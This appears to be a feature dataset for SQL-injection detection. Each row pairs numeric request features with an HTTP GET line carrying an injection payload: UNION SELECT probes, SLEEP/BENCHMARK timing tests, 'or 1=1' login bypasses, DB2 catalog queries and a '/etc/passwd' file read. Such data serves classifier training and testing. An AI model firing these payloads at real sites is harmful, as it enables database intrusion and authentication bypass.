230,2,200,3369,70,6,26,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12# HTTP/1.1
51,1,200,4123,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,6271,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5044,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,2116,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
47,2,200,2964,7,19,9,1,1,GET ?email=") or ("a"="a&phone=1-false HTTP/1.1
230,2,200,4225,90,7,36,1,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19--  HTTP/1.1
230,2,200,4028,70,6,26,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
214,1,200,1535,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,4348,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,3838,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,5563,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,4260,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,3061,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
214,1,200,5450,145,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
59,1,200,1652,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
59,1,200,2879,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
59,1,200,6938,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
59,1,200,6811,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
59,1,200,6225,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
59,1,200,1745,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
42,2,200,6896,9,14,8,1,1,GET ?email= and 1=1&pass= OR x=x# HTTP/1.1
98,1,200,2302,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,6486,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,6429,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,3297,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,2498,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,7093,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,6543,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,2312,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,2440,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
98,1,200,3999,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
74,2,200,7709,7,46,12,1,1,GET ?email=admin' #&phone=select current_setting('virtual_host'); HTTP/1.1
97,2,200,1709,7,66,13,1,1,GET ?name=select current_setting('log_connections');&phone=select * from syscat.tabauth; HTTP/1.1
57,1,200,6872,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5053,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,4945,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,7396,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2728,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2908,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
72,1,200,5771,38,8,10,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88))) HTTP/1.1
72,1,200,1041,38,8,10,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88))) HTTP/1.1
72,1,200,4405,38,8,10,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88))) HTTP/1.1
72,1,200,4215,38,8,10,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88))) HTTP/1.1
138,2,200,4753,53,11,20,1,1,GET ?account= ORDER BY 2-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
33,1,200,3128,14,5,3,1,1,GET ?phone= ORDER BY 30  HTTP/1.1
33,1,200,3412,14,5,3,1,1,GET ?phone= ORDER BY 30  HTTP/1.1
33,1,200,6923,14,5,3,1,1,GET ?phone= ORDER BY 30  HTTP/1.1
33,1,200,2048,14,5,3,1,1,GET ?phone= ORDER BY 30  HTTP/1.1
33,1,200,3185,14,5,3,1,1,GET ?phone= ORDER BY 30  HTTP/1.1
80,1,200,4124,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
80,1,200,6639,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
80,1,200,1482,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
38,1,200,5154,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,2779,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,2616,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,7184,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,7772,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,5845,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
38,1,200,4546,7,12,9,1,1,GET ?password='or 1=1 or ''=' HTTP/1.1
138,1,200,1232,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,3184,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,2207,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,4893,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,5427,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,4045,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
138,1,200,6054,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
268,2,200,7230,122,7,52,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5&name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
103,2,200,2332,31,8,18,1,1,GET ?mail='^'&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
41,1,200,3850,14,8,6,1,1,GET ?username=1' ORDER BY 1_2--  HTTP/1.1
41,1,200,4164,14,8,6,1,1,GET ?username=1' ORDER BY 1_2--  HTTP/1.1
41,1,200,3943,14,8,6,1,1,GET ?username=1' ORDER BY 1_2--  HTTP/1.1
41,1,200,5299,14,8,6,1,1,GET ?username=1' ORDER BY 1_2--  HTTP/1.1
41,1,200,5129,14,8,6,1,1,GET ?username=1' ORDER BY 1_2--  HTTP/1.1
33,1,200,4977,7,9,4,2,1,GET login/?id=" or 1=1 – HTTP/1.1
33,1,200,1288,7,9,4,2,1,GET login/?id=" or 1=1 – HTTP/1.1
33,1,200,7116,7,9,4,2,1,GET login/?id=" or 1=1 – HTTP/1.1
33,1,200,2458,7,9,4,2,1,GET login/?id=" or 1=1 – HTTP/1.1
20,1,200,7528,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,7500,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,3172,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,4344,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,1778,7,2,5,1,1,GET ?id=' # HTTP/1.1
72,1,200,6670,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,2347,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,6824,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,5647,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,5393,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,7931,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,7390,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
72,1,200,5550,31,5,11,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
30,1,200,2879,7,6,7,1,1,GET ?mail=' or 1=1 -- HTTP/1.1
30,1,200,6119,7,6,7,1,1,GET ?mail=' or 1=1 -- HTTP/1.1
30,1,200,2430,7,6,7,1,1,GET ?mail=' or 1=1 -- HTTP/1.1
30,1,200,4136,7,6,7,1,1,GET ?mail=' or 1=1 -- HTTP/1.1
30,1,200,4574,7,6,7,1,1,GET ?mail=' or 1=1 -- HTTP/1.1
52,2,200,5895,7,14,14,2,1,GET ?email=" or 1=1 –&phone=') or '1'='1'/* HTTP/1.1
145,2,200,1476,73,9,29,1,1,GET ?mail=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8# HTTP/1.1
56,2,200,2669,21,12,6,1,1,GET ?username= ORDER BY 10 &pass= ORDER BY 20#  HTTP/1.1
113,2,200,7679,37,24,19,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9&name=' GROUP BY columnnames having 1=1 -- HTTP/1.1
51,2,200,7806,7,21,11,1,1,GET ?code=") or true--&code=" or sleep(5)# HTTP/1.1
45,1,200,6561,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3 HTTP/1.1
45,1,200,5922,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3 HTTP/1.1
45,1,200,2533,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3 HTTP/1.1
45,1,200,7690,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3 HTTP/1.1
45,1,200,7885,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3 HTTP/1.1
72,1,200,2756,18,33,8,2,1,GET login/?id=' UNION SELECT sum(columnname ) from tablename -- HTTP/1.1
72,1,200,4643,18,33,8,2,1,GET login/?id=' UNION SELECT sum(columnname ) from tablename -- HTTP/1.1
30,1,200,7490,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
30,1,200,3322,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
30,1,200,3296,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
30,1,200,3065,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
30,1,200,2230,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
30,1,200,5313,12,6,5,1,1,GET ?mail=pg_SLEEP(5) HTTP/1.1
54,2,200,3497,21,8,8,1,1,GET ?mail=1' ORDER BY 2-- &pass= ORDER BY 14  HTTP/1.1
54,2,200,7512,14,16,12,1,1,GET ?name= ORDER BY 6-- &tel=' and 'one'='one HTTP/1.1
52,1,200,4988,7,28,6,3,1,GET ?phone=copy myfile from '/etc/passwd';  HTTP/1.1
52,1,200,2769,7,28,6,3,1,GET ?phone=copy myfile from '/etc/passwd';  HTTP/1.1
52,1,200,6669,7,28,6,3,1,GET ?phone=copy myfile from '/etc/passwd';  HTTP/1.1
52,1,200,5103,7,28,6,3,1,GET ?phone=copy myfile from '/etc/passwd';  HTTP/1.1
160,2,200,1946,48,30,16,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6-- &pass=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
348,2,200,3550,162,9,66,1,1,GET ?name= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))--  HTTP/1.1
53,2,200,1507,14,14,9,1,1,GET ?username=" or 1=1--&pass= ORDER BY 24#  HTTP/1.1
33,1,200,1472,14,4,4,1,1,GET ?user= ORDER BY 24#  HTTP/1.1
33,1,200,7255,14,4,4,1,1,GET ?user= ORDER BY 24#  HTTP/1.1
33,1,200,4468,14,4,4,1,1,GET ?user= ORDER BY 24#  HTTP/1.1
33,1,200,6798,14,4,4,1,1,GET ?user= ORDER BY 24#  HTTP/1.1
29,1,200,3494,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,1350,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,6695,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,6811,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,7199,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,5855,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,7874,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,1039,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,5115,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,1186,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
29,1,200,3568,7,7,7,1,1,GET ?email=' or '' ' HTTP/1.1
169,2,200,1542,39,9,17,1,1,GET ?email= WHERE 1=1 AND 1=0#&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
24,1,200,1367,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,6586,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,3189,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,5725,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,3091,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,2328,7,8,4,1,1,GET ?username== HTTP/1.1
24,1,200,3478,7,8,4,1,1,GET ?username== HTTP/1.1
56,2,200,5539,14,11,17,1,1,GET ?name=') or ('1'='1'--&phone= ORDER BY 2--  HTTP/1.1
57,2,200,1142,14,18,10,1,1,GET ?account= ORDER BY 21# &pass=1) or sleep(5)# HTTP/1.1
79,2,200,3575,10,44,10,1,1,GET ?email=select session_user from sysibm.sysdummy1;&pass= AND 1=0--  HTTP/1.1
66,1,200,5751,7,36,10,2,1,GET ?account=admin' and substring(password/text()_1_1)='7 HTTP/1.1
66,1,200,2300,7,36,10,2,1,GET ?account=admin' and substring(password/text()_1_1)='7 HTTP/1.1
66,1,200,1799,7,36,10,2,1,GET ?account=admin' and substring(password/text()_1_1)='7 HTTP/1.1
81,2,200,6572,14,43,8,1,1,GET ?mail= ORDER BY 12# &pass=select session_user from sysibm.sysdummy1; HTTP/1.1
93,1,200,1088,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
93,1,200,1774,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
93,1,200,3405,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
93,1,200,4035,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
93,1,200,6723,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
93,1,200,4644,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
136,1,200,2307,66,7,25,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
136,1,200,5662,66,7,25,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
136,1,200,4891,66,7,25,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
54,2,200,5629,7,15,19,1,1,GET ?name=")) or (("x"))=(("x&phone=' or ''^' HTTP/1.1
96,2,200,4291,21,17,9,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16&phone=pg_sleep(5)-- HTTP/1.1
39,1,200,7696,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,2161,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,2592,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,7743,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,6444,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,7655,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
39,1,200,2850,7,9,16,1,1,GET ?phone=')) or (('x'))=(('x HTTP/1.1
114,2,200,5638,39,9,16,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12&phone= WHERE 1=1 AND 1=0# HTTP/1.1
233,2,200,3585,70,9,26,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18# HTTP/1.1
100,1,200,2371,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,4392,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
